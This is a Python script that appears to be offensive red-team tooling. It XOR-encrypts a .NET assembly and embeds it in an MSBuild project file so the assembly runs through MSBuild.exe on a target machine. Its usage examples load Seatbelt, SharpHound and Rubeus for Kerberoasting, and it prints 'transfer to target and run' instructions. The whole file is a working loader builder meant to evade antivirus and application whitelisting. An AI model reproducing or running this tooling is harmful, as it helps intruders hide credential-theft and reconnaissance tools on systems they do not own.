#!/usr/bin/env python3
"""
build_msbuild.py — Encrypts a .NET assembly and injects it into msbuild_payload.csproj

Usage:
  python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]

  Everything after -- is passed as arguments to the loaded assembly's Main().

Examples:
  python build_msbuild.py Seatbelt.exe -- -group=all
  python build_msbuild.py Rubeus.exe -- kerberoast
  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All -o C:\\Windows\\Temp\\out.zip
  python build_msbuild.py Seatbelt.exe --key deadbeefcafebabe1234567890abcdef
"""

import argparse
import os
import re
import sys


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def format_cs_array(data: bytes, indent: str = "        ") -> str:
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        if i + 16 < len(data):
            hex_str += ","
        lines.append(f"{indent}{hex_str}")
    return "\n".join(lines)


def format_cs_args(args: list[str], indent: str = "        ") -> str:
    if not args:
        return ""
    entries = []
    for arg in args:
        escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
        entries.append(f'{indent}"{escaped}",')
    return "\n".join(entries)


def main():
    # Split argv on "--" so everything after it becomes assembly args
    # This avoids argparse choking on assembly args that start with -
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into msbuild_payload.csproj"
    )
    parser.add_argument("assembly", help="Path to .NET assembly to encrypt")
    parser.add_argument("--key", help="XOR key as hex string (auto-generated if omitted)")
    parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
    parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
    args = parser.parse_args(argv)
    args.args = assembly_args

    # Resolve paths relative to script directory
    script_dir = os.path.dirname(os.path.abspath(__file__))

    template_path = args.template or os.path.join(script_dir, "msbuild_payload.csproj")
    output_path = args.output or os.path.join(script_dir, "msbuild_ready.csproj")

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)

    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    # Read assembly
    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    # Generate or parse key
    if args.key:
        key = bytes.fromhex(args.key)
    else:
        key = os.urandom(16)
    print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

    # Encrypt
    encrypted = xor_encrypt(assembly_bytes, key)

    # Format as C# byte arrays
    encrypted_cs = format_cs_array(encrypted)
    key_cs = format_cs_array(key)

    # Format args
    args_cs = format_cs_args(args.args)

    # Read template
    with open(template_path, "r") as f:
        template = f.read()

    # Replace the encryptedAssembly placeholder
    template = re.sub(
        r'(static byte\[\] encryptedAssembly = new byte\[\] \{)\s*\n\s*// PASTE ENCRYPTED ASSEMBLY BYTES HERE\s*\n\s*0x00\s*// placeholder\s*\n(\s*\};)',
        rf'\1\n{encrypted_cs}\n\2',
        template
    )

    # Replace the xorKey placeholder
    template = re.sub(
        r'(static byte\[\] xorKey = new byte\[\] \{)\s*\n\s*// PASTE XOR KEY HERE\s*\n\s*0x00\s*// placeholder\s*\n(\s*\};)',
        rf'\1\n{key_cs}\n\2',
        template
    )

    # Replace the args placeholder
    if args_cs:
        template = re.sub(
            r'(static string\[\] assemblyArgs = new string\[\] \{)\s*\n\s*// "-group=all",\s*\n\s*// "-outputfile=C:\\\\Windows\\\\Temp\\\\out\.txt",\s*\n(\s*\};)',
            rf'\1\n{args_cs}\n\2',
            template
        )

    # Strip any non-ASCII characters that could corrupt during transfer
    template = template.encode("ascii", errors="ignore").decode("ascii")

    # Write output as ASCII to prevent encoding issues on Windows
    with open(output_path, "w", encoding="ascii") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] Transfer to target and run:", file=sys.stderr)
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {os.path.basename(output_path)}", file=sys.stderr)


if __name__ == "__main__":
    main()
